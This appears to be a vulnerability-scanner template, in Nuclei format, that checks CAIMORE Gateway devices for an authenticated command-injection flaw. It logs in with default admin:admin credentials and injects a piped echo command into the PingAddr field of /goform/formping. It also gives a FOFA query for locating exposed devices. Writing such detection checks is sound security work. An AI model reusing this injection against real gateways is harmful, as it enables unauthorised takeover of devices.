id: caimore-gateway-rce

info:
  name: CAIMORE Gateway - 远程代码执行漏洞
  author: momika233
  severity: high
  description: CAIMORE Gateway - 远程代码执行 存在远程代码执行漏洞。攻击者在无需授权或仅需较低权限的情况下，可能在目标主机上执行任意命令并完全控制系统。
  reference:
    - https://www.ctfiot.com/126482.html
  classification:
    cwe-id: CWE-78
  metadata:
    max-request: 2
    fofa-query: app="CAIMORE-Gateway"
  tags: ciamore-gateway,rce,authenticated,intrusive,vuln

http:
  - raw:
      - |
        POST /goform/formping HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}
        Accept-Encoding: gzip

        PingAddr=127.0.0.1%7Cecho%20{{randstr}}&PingPackNumb=1&PingMsg=
      - |
        GET /pingmessages HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}
        Accept-Encoding: gzip

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - "{{randstr}}"

      - type: status
        status:
          - 200
